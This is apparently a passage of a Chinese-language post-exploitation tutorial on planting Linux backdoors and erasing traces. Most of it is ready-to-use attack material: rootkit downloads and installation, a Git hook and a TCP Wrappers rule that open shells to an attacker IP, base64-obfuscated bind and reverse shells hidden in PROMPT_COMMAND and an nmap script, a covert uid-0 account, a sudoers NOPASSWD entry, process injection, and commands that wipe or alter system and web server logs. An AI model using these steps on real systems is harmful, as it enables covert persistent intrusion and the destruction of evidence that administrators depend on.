下载地址：[https://raw.githubusercontent.com/yzimhao/godpock/master/Rootkit/mafix.tar.gz](https://raw.githubusercontent.com/yzimhao/godpock/master/Rootkit/mafix.tar.gz)
```php
1.首先是获得远程服务器的root权限
2.然后下载rootkit程序 mafix
3.开始安装
tar -xvzf mafix.tar.gz
cd mafix
./root rootkit 123
(其中rootkit为你连接后门程序时的密码，123为连接的端口)
可以验证一下是否成功：
netstat -anlp|grep 123
```
利用方法：安装完成后，使用ssh 用户@IP -P 配置的端口，即可远程登录。
​

------

### 十一、利用系统服务程序
```php
修改/etc/inetd.conf
daytime stream tcp nowait /bin/sh sh –I
用trojan程序替换in.telnetd、in.rexecd等inted的服务程序重定向login程序
```


------

### 十二、共享库文件
```php
在共享库中嵌入后门函数
使用后门口令激活Shell，获得权限
能够躲避系统管理员对二进制文件本身的 校验
```
## 
十三、可装载内核模块(LKM）
LKM:Loadable Kernel Modules
动态的加载，不需要重新编译内核。
截获系统调用，具有隐藏目录、文件、进 程、网络连接等强大功能。
自身隐蔽性好，发现难度较大。
著名的LKM包有adore和knark。
内核级rootkit Kbeast的安装与使用
支持的内核版本有2.6.16, 2.6.18, 2.6.32, and 2.6.35。
wget [http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz](http://core.ipsecs.com/rootkit/kernel-rootkit/ipsecs-kbeast-v1.tar.gz)
config.h配置密码等
[![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635994029655-42cc363f-abcd-4782-ab4f-7a37e1927805.png#clientId=ud66f4ed1-ea09-4&from=paste&id=u0fe4cd47&margin=%5Bobject%20Object%5D&name=image.png&originHeight=698&originWidth=680&originalType=url&ratio=1&size=355270&status=done&style=none&taskId=u605d2d53-75bd-4887-bbfb-f2364d29d7e)](https://p5.ssl.qhimg.com/t01c52fe0a31c8eebab.jpg)
安装./setup build
[![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635994045907-b02f1155-3d79-4299-86de-dc980a8218c5.png#clientId=ud66f4ed1-ea09-4&from=paste&id=u0aabd80a&margin=%5Bobject%20Object%5D&name=image.png&originHeight=496&originWidth=960&originalType=url&ratio=1&size=528129&status=done&style=none&taskId=ua47c879f-a273-4bb2-b090-129bc2b6e88)](https://p1.ssl.qhimg.com/t01b47f6f760fa5aa93.jpg)
守护进程的PID是1747
隐藏目录:
[![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635994072306-006c5847-2fe3-4381-a8eb-ac643b4963ea.png#clientId=ud66f4ed1-ea09-4&from=paste&id=u579d0aa4&margin=%5Bobject%20Object%5D&name=image.png&originHeight=768&originWidth=1214&originalType=url&ratio=1&size=992029&status=done&style=none&taskId=u4c9e70f1-ede4-4a56-b638-bc8706ec0e9)](https://p3.ssl.qhimg.com/t018c9bf6169020d5d0.jpg)
通过命令是无法查看开放端口的
[![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635994081793-04732e82-f47f-4196-b3fc-33edfd8986a7.png#clientId=ud66f4ed1-ea09-4&from=paste&id=uf9c6f0f0&margin=%5Bobject%20Object%5D&name=image.png&originHeight=428&originWidth=1718&originalType=url&ratio=1&size=1018371&status=done&style=none&taskId=u829f5773-61c3-4690-95fc-94ebea39e00)](https://p3.ssl.qhimg.com/t01dea1fa4850020b98.jpg)
ps aux命令也是无法查看到进程，除非指定进程名称，我们把后门进程名称伪靠系统服务也是可以让管理员头疼。
而通过nmap全端口扫描出现了13377后门端口，通过telnet连接
[![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635994092336-32072598-f55f-4c1b-8d99-85b5d7bdb619.png#clientId=ud66f4ed1-ea09-4&from=paste&id=ud9de8350&margin=%5Bobject%20Object%5D&name=image.png&originHeight=684&originWidth=1386&originalType=url&ratio=1&size=1327983&status=done&style=none&taskId=u88f3acbd-f235-46c2-8c32-5122fd2428d)](https://p1.ssl.qhimg.com/t01ae89c306a7c37fb4.jpg)
使用总结：
隐藏进程、隐藏端口
支持版本太少、重启将失效。
[http://vinc.top/2016/06/07/%E5%86%85%E6%A0%B8%E7%BA%A7rootkit-kbeast%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/](http://vinc.top/2016/06/07/%E5%86%85%E6%A0%B8%E7%BA%A7rootkit-kbeast%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/)

------

### 十四、隐藏文件
Linux/Unix 藏文件和文件夹
Linux/Unix 下想藏 Webshell 或者后门什么的，可以利用一下隐藏文件夹和文件。
方法一
比如创建一个名字开头带 . 的 Webshell 或者文件夹，默认情况下是不会显示出来的，浏览器访问的时候加点访问就行。（查看方法：ls -a）
touch .webshell.php 创建名字为 .webshell.php 的文件
mkdir .backdoor/ 创建名字为 .backdoor 的文件夹
终极方法
在管理员喝多了或者脑子转不过来的情况下，是绝对不会发现的！至少我用了这么久是没几个发现的。
是文件的话浏览器访问直接输 … 就行，目录同理。
touch … 创建名字为 … 的文件
mkdir … 创建名字为 … 的文件夹
​

------

### 十五、Git hooks
原是XTERM反弹Shell，老外与Git结合
echo "xterm -display <attacker IP>:1 &" > .git/hooks/pre-commit
chmod +x .git/hooks/pre-commit
Xnest:1
当更新git的时候会触发:
git commit -am "Test"
​

------

### 十六、PROMPT_COMMAND后门
bash提供了一个环境变量PROMPT_COMMAND,这个变量会在你执行命令前执行一遍。
一般运维人员都将用来记录每个用户执行命令的时间ip等信息。
每执行一个命令之前都会调用这个变量将你操作的命令记录下来。
```php
export PROMPT_COMMAND='{ date "+[ %Y%m%d %H:%M:%S `whoami` ] `history 1 | { read x cmd; echo "$cmd      from ip:$SSH_CLIENT   $SSH_TTY"; }`"; }&gt;&gt; /home/pu/login.log'
```
但是在安全人员手里味道变得不一样了
```php
export PROMPT_COMMAND="lsof -i:1025 &>/dev/null || (python -c "exec('aW1wb3J0IHNvY2tldCxvcyxzeXMKcz1zb2NrZXQuc29ja2V0KCkKcy5iaW5kKCgiIiwxMDI1KSkKcy5saXN0ZW4oMSkKKGMsYSk9cy5hY2NlcHQoKQp3aGlsZSAxOgogZD1jLnJlY3YoNTEyKQogaWYgJ2V4aXQnIGluIGQ6CiAgcy5jbG9zZSgpCiAgc3lzLmV4aXQoMCkKIHI9b3MucG9wZW4oZCkucmVhZCgpCiBjLnNlbmQocikK'.decode('base64'))" 2>/dev/null &)"
```
Base64解密:
```php
import socket,os,sys
s=socket.socket()
s.bind(("",1025))
s.listen(1)
(c,a)=s.accept()
while 1:
 d=c.recv(512)
 if 'exit' in d:
  s.close()
  sys.exit(0)
 r=os.popen(d).read()
 c.send(r)
```
NC连接
nc 192.168.1.174 1025
​

------

### 十七、PROMPT_COMMAND提权
这个只是留做后门,有些黑客则是利用这点来进行提权。
这个要求管理员有su的习惯，我们可以通过它来添加一个id=0的用户
export PROMPT_COMMAND="/usr/sbin/useradd -o -u 0 hack &>/dev/null && echo hacker:123456 | /usr/sbin/chpasswd &>/dev/null && unset PROMPT_COMMAND"
除此之外可以利用script记录某人行为:
基本用法:
script -t 2>demo.time -a demo.his 记录保存为录像
scriptreplay demo.time demo.his 播放记录
用户家目录下,修改环境变量，使得用户登录就会触发录像
```php
vi ~/.profile 
script -t -f -q 2>/wow/$USER-$UID-`date +%Y%m%d%H%M%S`.time -a /wow/$USER-$UID-`date +%Y%m%d%H%M%S`.his
```


------

### 十八、Sudoers “trick”
其实Sudoers并不算后门,是一个Linux用户控制权限
通过root权限改写对普通用户可执行root命令

```php
sudo su -c "echo 'mx7krshell ALL = NOPASSWD: ALL' >> /etc/sudoers.d/README" 
```
授权用户/组 主机=[(切换到哪些用户或组)] [是否需要输入密码验证] 命令1,命令2,...
[![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635994245475-da136719-5f7d-41e0-a5d7-6552a13dff84.png#clientId=ud66f4ed1-ea09-4&from=paste&id=ub94f5685&margin=%5Bobject%20Object%5D&name=image.png&originHeight=334&originWidth=976&originalType=url&ratio=1&size=308591&status=done&style=none&taskId=uab846b8b-42ef-4ddd-9f27-af2ada8ecce)](https://p2.ssl.qhimg.com/t013282f378c5798546.jpg)
​

------

### 十九、TCP Wrappers
TCP_Wrappers是一个工作在应用层的安全工具，它只能针对某些具体的应用或者服务起到一定的防护作用。比如说ssh、telnet、FTP等服务的请求，都会先受到TCP_Wrappers的拦截。
TCP_Wrappers有一个TCP的守护进程叫作tcpd。以telnet为例，每当有telnet的连接请求时，tcpd即会截获请求，先读取系统管理员所设置的访问控制文件，合乎要求，则会把这次连接原封不动的转给真正的telnet进程，由telnet完成后续工作；如果这次连接发起的ip不符合访问控制文件中的设置，则会中断连接请求，拒绝提供telnet服务。
```php
ALL: ALL: spawn (bash -c "/bin/bash -i >& /dev/tcp/<Attack IP>/443 0>&1") & :allow
```
ssh访问目标主机ssh [qweqwe@192.168.4](mailto:qweqwe@192.168.4).100触发后门
[![](https://cdn.nlark.com/yuque/0/2021/jpeg/1660081/1635994484794-e7e99a6f-abf4-4f6d-b42f-9f64c7b9489f.jpeg#clientId=ud66f4ed1-ea09-4&from=paste&id=u481cd92e&margin=%5Bobject%20Object%5D&originHeight=680&originWidth=1028&originalType=url&ratio=1&status=done&style=none&taskId=u4845cbc2-0b54-450f-ac13-b8481c28c40)](https://p0.ssl.qhimg.com/t01dfa59bdf6f66d19d.jpg)
​

------

### 二十、nmap nse后门
很多linux系统中默认都安装了nmap
```php
mkdir -p ~/.nmap/scripts/
cd ~/.nmap/scripts/
curl -O 'https://raw.githubusercontent.com/ulissescastro/linux-native-backdoors/master/nmap/http-title.nse'
```
```php
  local payload = "ZWNobyAiKi8xICogKiAqICogcHl0aG9uIC1jIFwiZXhlYygnYVcxd2IzSjBJSE52WTJ0bGRDeHpkV0p3Y205alpYTnpMRzl6TzJodmMzUTlKekV5Tnk0d0xqQXVNU2M3Y0c5eWREMDBORE03Y3oxemIyTnJaWFF1YzI5amEyVjBLSE52WTJ0bGRDNUJSbDlKVGtWVUxITnZZMnRsZEM1VFQwTkxYMU5VVWtWQlRTazdjeTVqYjI1dVpXTjBLQ2hvYjNOMExIQnZjblFwS1R0dmN5NWtkWEF5S0hNdVptbHNaVzV2S0Nrc01DazdiM011WkhWd01paHpMbVpwYkdWdWJ5Z3BMREVwTzI5ekxtUjFjRElvY3k1bWFXeGxibThvS1N3eUtUdHdQWE4xWW5CeWIyTmxjM011WTJGc2JDaGJKeTlpYVc0dlltRnphQ2NzSUNjdGFTZGRLVHNLJy5kZWNvZGUoJ2Jhc2U2NCcpKVwiIiB8IGNyb250YWI="

```
base64解密
```php
echo "*/1 * * * * python -c "exec('aW1wb3J0IHNvY2tldCxzdWJwcm9jZXNzLG9zO2hvc3Q9JzEyNy4wLjAuMSc7cG9ydD00NDM7cz1zb2NrZXQuc29ja2V0KHNvY2tldC5BRl9JTkVULHNvY2tldC5TT0NLX1NUUkVBTSk7cy5jb25uZWN0KChob3N0LHBvcnQpKTtvcy5kdXAyKHMuZmlsZW5vKCksMCk7b3MuZHVwMihzLmZpbGVubygpLDEpO29zLmR1cDIocy5maWxlbm8oKSwyKTtwPXN1YnByb2Nlc3MuY2FsbChbJy9iaW4vYmFzaCcsICctaSddKTsK'.decode('base64'))"" | crontab#
```
解密
```php
import socket,subprocess,os;host='127.0.0.1';port=443;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((host,port));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);p=subprocess.call(['/bin/bash', '-i']);
```
可以将127.0.0.1改成你的地址
[![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635994690944-928c4bb4-8a89-480d-9a2f-07802b17122a.png#clientId=ud66f4ed1-ea09-4&from=paste&id=uddff45da&margin=%5Bobject%20Object%5D&name=image.png&originHeight=504&originWidth=2128&originalType=url&ratio=1&size=1447619&status=done&style=none&taskId=u319c975a-a0b8-48c9-802c-74540a659c5)]

------

### 二十一、进程注入
cymothoa进程注入后门
./cymothoa -p 1014 -s 0 -y 8888

[![image.png](https://cdn.nlark.com/yuque/0/2021/png/1660081/1635994340028-ef088dda-e32a-4f32-81c9-4ce233fdf133.png#clientId=ud66f4ed1-ea09-4&from=paste&id=u734fdf6b&margin=%5Bobject%20Object%5D&name=image.png&originHeight=510&originWidth=1388&originalType=url&ratio=1&size=703425&status=done&style=none&taskId=u4d011215-ea45-4e08-989b-7d5eb9f19b9)](https://p4.ssl.qhimg.com/t0123a64c8dc5b75966.jpg)

只能连接一次后就失效没啥用。
[https://github.com/jorik041/cymothoa](https://github.com/jorik041/cymothoa)
​

**参考文档：**
[https://zhuanlan.zhihu.com/p/116030154](https://zhuanlan.zhihu.com/p/116030154)
[https://www.anquanke.com/post/id/155943#h2-21](https://www.anquanke.com/post/id/155943#h2-21) 

https://blog.csdn.net/qq_39101049/article/details/99896459



## 0x05 痕迹清除

### 一、清除历史命令记录
bash去掉history记录
```php
export HISTSIZE=0
export HISTFILE=/dev/null
```
### 二、修改上传文件时间戳
```php
touch -r 老文件时间戳 新文件时间戳
```
### 三、Linux日志修改
#### Apache日志修改
Apache主要的日志就是access.log和error_log，前者记录了HTTTP的访问记录，后者记录了服务器的错误日志。根据Linux的配置不同和Apache的版本的不同，文件的放置位置也是不同的，不过这些都可以在httpd.conf中找到。
**删除/替换部分日志**
```php
sed -i 's/192.168.166.85/192.168.1.1/g' access.log
//直接替换日志IP地址
cat /var/log/nginx/access.log | grep -v evil.php > tmp.log
//使用grep -v来把我们的相关信息删除
cat tmp.log > /var/log/nginx/access.log/
//把修改过的日志覆盖到原日志文件
```


#### MySQL日志文件修改
然后就是MySQl的日志文件，这个我们可以在/etc/my.cnf中找到。
```php
 [mysqld]
###此处省略N个字
log-error=/var/log/mysql/mysql_error.log    #错误日志
log=/var/log/mysql/mysql.log                       ###最好注释掉,会产生大量的日志,包括每一个执行的sql及环境变量的改变等等
log-bin=/var/log/mysql/mysql_bin.log          # 用于备份恢复,或主从复制.这里不涉及。 log-slow-queries=/var/log/mysql/mysql_slow.log  #慢查询日志

[mysqld_safe]
log-error=/var/log/mysql/mysqld.log
pid-file=/var/run/mysqld/mysqld.pid
```
**​删除/替换部分日志**
```php
sed –i ‘s/192\.168\.1\.3/192\.168\.1\.4/g’ /var/log/mysql/mysql_slow.log
```
至于二进制日志文件，需要登录mysql client来修改删除，建议这种操作最先执行。


#### php日志修改
接下来是PHP，在PHP5里，我们可以通过关闭display_errors后能够把错误信息记录下来，便于查找服务器运行的原因。可在php.ini内找到位置。
```php
log_errors = On 
error_log =/var/log/apache/php_error.log      ##这个是管理员自定义的，并没有确切的位置
```
**删除/替换部分日志**
```php
sed –i 's/192.168.1.3/192.168.1.4/g' /var/log/apache/php_error.log
```
**​**

#### Linux日志
Linux 系统存在多种日志文件，来记录系统运行过程中产生的日志。
```php
/var/log/btmp   记录所有登录失败信息，使用lastb命令查看 
/var/log/lastlog 记录系统中所有用户最后一次登录时间的日志，使用lastlog命令查看 
/var/log/wtmp    记录所有用户的登录、注销信息，使用last命令查看 
/var/log/utmp    记录当前已经登录的用户信息，使用w,who,users等命令查看 
/var/log/secure   记录与安全相关的日志信息 
/var/log/message  记录系统启动后的信息和错误日志 
```
**第一种方式：清空日志文件**
```php
清除登录系统失败的记录：echo > /var/log/btmp              #使用lastb命令
清除登录系统成功的记录：echo > /var/log/wtmp   						#使用last命令
清除用户最后一次登录时间：echo > /var/log/lastlog          #lastlog命令 
清除当前登录用户的信息：echo >   /var/log/utmp             #使用w,who,users等命令 
清除安全日志记录：cat /dev/null >  /var/log/secure 
清除系统日志记录：cat /dev/null >  /var/log/message 
```
**第二种方式：删除/替换部分日志**
日志文件全部被清空，太容易被管理员察觉了，如果只是删除或替换部分关键日志信息，那么就可以完美隐藏攻击痕迹。

```php
# 删除所有匹配到字符串的行,比如以当天日期或者自己的登录ip 
sed  -i '/自己的ip/'d  /var/log/messages 
 
# 全局替换登录IP地址： 
sed -i 's/192.168.166.85/192.168.1.1/g' secure 
```
清除脚本:
[https://github.com/JonGates/jon](https://github.com/JonGates/jon)

### 四、隐藏远程SSH登陆记录
隐身登录系统，不会被w、who、last等指令检测到。
```php
ssh -T root@192.168.0.1 /bin/bash -i
```
不记录ssh公钥在本地.ssh目录中
```php
ssh -o UserKnownHostsFile=/dev/null -T user@host /bin/bash –i
```


**参考资料：**
[http://www.jinglingshu.org/?p=4842](http://www.jinglingshu.org/?p=4842)
[https://os.51cto.com/art/202009/626022.htm](https://os.51cto.com/art/202009/626022.htm)
